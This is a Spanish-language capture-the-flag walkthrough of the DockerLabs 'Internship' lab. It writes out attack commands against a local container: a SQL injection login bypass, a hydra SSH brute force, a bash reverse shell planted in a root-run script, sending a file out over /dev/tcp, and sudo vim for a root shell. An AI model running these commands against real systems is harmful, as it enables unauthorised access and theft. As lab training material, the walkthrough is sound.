### Internship - DockerLabs 🇪🇸

#### 1. Primero vamos a desempaquetar el archivo y lo movemos a nuestra zona de trabajo.
```bash
unzip internship.zip 
```

<img width="851" height="318" alt="image" src="https://github.com/user-attachments/assets/1aaa1dec-4e50-4e84-bc66-9eb7f25768be" />


#### 1.2 Ahora vamos a encender el laboratorio.
```bash

```

<img width="852" height="421" alt="image" src="https://github.com/user-attachments/assets/b489d1ce-f053-4eff-80b4-26ea2c29bd26" />


#### 2. Vamos a escanear los puertos ocultos mediante nmap.
```bash
 nmap -sCV 172.17.0.2
```

<img width="859" height="384" alt="image" src="https://github.com/user-attachments/assets/76ad845c-588e-4f45-8ac6-5e148c7aff7d" />


#### 3. Vamos a realizar un curl para poder ver todo el codigo, nos encontraremos con un dominio desconocido.
```bash
 curl -l "http://172.17.0.2/"
```

<img width="858" height="543" alt="image" src="https://github.com/user-attachments/assets/4c6ac4ba-135c-4714-8aba-1d217a5e0337" />


#### 4. Ahora vamos a añadir ese dominio a etc/hosts para poder acceder a la web.
```bash
sudo nano /etc/hosts
```

<img width="853" height="274" alt="image" src="https://github.com/user-attachments/assets/56eceeb6-1d29-493b-9a2c-66e986c491d6" />


#### 5. Podremos acceder a esa web.

<img width="1065" height="1004" alt="image" src="https://github.com/user-attachments/assets/902bac10-b1c3-4842-9fb4-5af66cad8cea" />


#### 6. Ahora procederemos a realizar una busqueda de directorios ocultos con gobuster de la nueva web.
```bash
gobuster dir -u http://gatekeeperhr.com \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x html,php,txt,py,sh,log
```

<img width="848" height="847" alt="image" src="https://github.com/user-attachments/assets/9aa303ac-73ff-4384-ac64-9c9a21b2f9e0" />


#### 7. Vamos a ir a la opción de login y vamos a intentar realizar una inyección sql.
```sql
' OR 1=1 -- -
```

<img width="1064" height="996" alt="image" src="https://github.com/user-attachments/assets/6def8cfa-06fc-4de1-86e9-7cb1d51e2211" />


#### 8. Ahora vamos a ver el codigo fuente y veremos un comentario.

<img width="1062" height="972" alt="image" src="https://github.com/user-attachments/assets/c9974e29-a861-4935-a751-5e14a50b3827" />

#### 8.2 Vamos a ir ahora al directorio de spam y encontraremos otro archivo comentado codificado a ROT 13

<img width="1103" height="369" alt="image" src="https://github.com/user-attachments/assets/4ceeddb7-f11a-4a17-931a-2ded244e5349" />

**Lo vamos a descifrar.**
```bash
echo "Yn pbagrenfran qr hab qr ybf cnfnagrf rf 'checy3'" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

<img width="859" height="161" alt="image" src="https://github.com/user-attachments/assets/b91aaacf-7920-4731-90a4-b4f6f7df00f4" />



#### Ahora sabiendo una contraseña realizaremos todas las posibles situaciones de combinaciones con los nombre en un txt.`nano users.txt`
```bash
pedro
ramirez
pedroramirez
pedro.ramirez
pedro_ramirez
pramirez
p.ramirez
pedror
ramirezp

valentina
gomez
valentinagomez
valentina.gomez
valentina_gomez
vgomez
v.gomez
valentinag
gomezv
```

#### 9. Ahora vamos a realizar mediante fuerza bruta hydra.
```bash
cat users.txt | grep -oE 'pedro|valentina' | tee users
                              hydra -L users -p purpl3 -u ssh://$target -t 64
```

<img width="847" height="394" alt="image" src="https://github.com/user-attachments/assets/96799ed4-d755-48b6-b3e6-7072d1447fbe" />


#### 10. Entraremos mediante ssh ahora que conocemos el usuario y la contraseña.
```bash
ssh pedro@172.17.0.2
```

<img width="858" height="246" alt="image" src="https://github.com/user-attachments/assets/8e393249-7564-44cc-9d0f-3c7d5b283df7" />

### Pillamos la flag de pedro

<img width="857" height="543" alt="image" src="https://github.com/user-attachments/assets/bf3eea1a-fdc1-49c6-a60d-b8f79faa55d4" />


#### 11. Vamos a proceder a escalar privilegios, primero veremos los binarios con `sudo -l` y `find / -perm -4000 -type f 2>/dev/null`

<img width="849" height="356" alt="image" src="https://github.com/user-attachments/assets/3a218b77-7bd9-4d44-a879-4559cff02d19" />


#### 11.2 Veremos que procesos se están ejecutando 
```bash
ls -la /opt/
cat /opt/log_cleaner.sh
```

<img width="858" height="171" alt="image" src="https://github.com/user-attachments/assets/42921fbb-a63b-4e48-819b-d331951b0f1f" />


#### 11.3 Ya que podemos modificar el archivo bash ejecutaremos un exploit para escala de privilegipos, en `nano /opt/log/cleaner.sh`
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
```

<img width="880" height="205" alt="image" src="https://github.com/user-attachments/assets/39ab9be7-0bec-4ed9-a698-f3ca7ec26dec" />


#### 11.4 Nos ponemos a escuchar desde la terminal de kali para conseguir el acceso al usuario de valentina.
```bash
nc -lnvp 4444
```

<img width="860" height="141" alt="image" src="https://github.com/user-attachments/assets/4cf1cf1f-0db1-45bb-ad79-16ae6432f3d0" />


### Pillamos la flag de valentina.

<img width="857" height="505" alt="image" src="https://github.com/user-attachments/assets/c16107ed-a06f-4017-a326-125619375de4" />


#### 12. Ahora nos pasaremos la foto de valentina a nuestra terminal mediante nc.

**En nuestro kali**
```bash
cd /home/adri/Escritorio/HackTheBox/Labs/Internship/
                           nc -l -p 4444 > profile_picture.jpeg
```

**En Valentina**
```bash
cat profile_picture.jpeg > /dev/tcp/172.17.0.1/4444
```

<img width="1047" height="107" alt="image" src="https://github.com/user-attachments/assets/f7a8e6bf-270f-4471-b8e4-2f26f83de220" />


#### 13. Con estsa herramienta miraremos si tiene algo oculto la imagen
```bash
steghide extract -sf profile_picture.jpeg
```

<img width="1074" height="248" alt="image" src="https://github.com/user-attachments/assets/f996e7ac-72a2-4ad4-adbf-3ebdd5674cab" />


#### 14. Veremos con `sudo -l` y la contraseña 'mag1ck' que podemos ejecutar el binario de bash que modificamos anteriormente.
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

<img width="854" height="134" alt="image" src="https://github.com/user-attachments/assets/e4d643cb-e2e3-47d8-8edb-a6fff973d37a" />


### La flag de root.

<img width="857" height="483" alt="image" src="https://github.com/user-attachments/assets/92e97c6a-db34-4bc1-a3bb-d46164c8911e" />





